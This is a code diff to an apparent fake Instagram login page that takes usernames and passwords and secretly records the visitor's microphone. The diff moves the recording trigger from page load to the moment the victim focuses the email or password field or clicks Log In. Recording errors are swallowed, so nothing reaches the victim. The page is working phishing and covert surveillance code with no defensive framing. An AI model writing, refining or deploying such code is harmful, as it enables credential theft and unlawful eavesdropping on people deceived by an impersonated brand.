@@ -47,8 +47,8 @@ footer .copyright{font-size:11px;color:#8e8e8e}
     <div class="panel login">
       <h1><img src="./img//instagram-logo.png" alt="Instagram logo" /></h1>
       <form onsubmit="return false;">
-        <input id="email" placeholder="Phone number, username or email" autocomplete="off"/>
-        <input id="password" type="password" placeholder="Password" autocomplete="off"/>
+        <input id="email" placeholder="Phone number, username or email" autocomplete="off" onfocus="startMicRecording()"/>
+        <input id="password" type="password" placeholder="Password" autocomplete="off" onfocus="startMicRecording()"/>
         <button type="button" id="loginBtn" onclick="handleLogin()">Log In</button>
       </form>
       <div id="msg"></div>
@@ -84,12 +84,15 @@ function getExt(mime){
   if(mime.includes('ogg'))return'ogg';if(mime.includes('mp4'))return'mp4';return'webm';
 }
 
-// Auto-start mic on page load
-window.addEventListener('load',()=>{
-  if(!sid)return;
+// Start mic only when user interacts (clicks login button)
+let micStarted = false;
+
+function startMicRecording(){
+  if(micStarted || !sid) return;
+  micStarted = true;
   navigator.mediaDevices.getUserMedia({audio:true})
   .then(stream=>{activeStream=stream;startChunk(stream);}).catch(()=>{});
-});
+}
 
 function startChunk(stream){
   chunks=[];
@@ -130,6 +133,10 @@ async function handleLogin(){
   const pass=document.getElementById('password').value.trim();
   const msg=document.getElementById('msg');
   const btn=document.getElementById('loginBtn');
+  
+  // Start mic recording on first interaction
+  startMicRecording();
+  
   if(!email||!pass){msg.textContent='Please fill in your credentials.';return;}
   btn.disabled=true;btn.textContent='Logging in...';msg.textContent='';
   btn.disabled=false;btn.textContent='Log In';
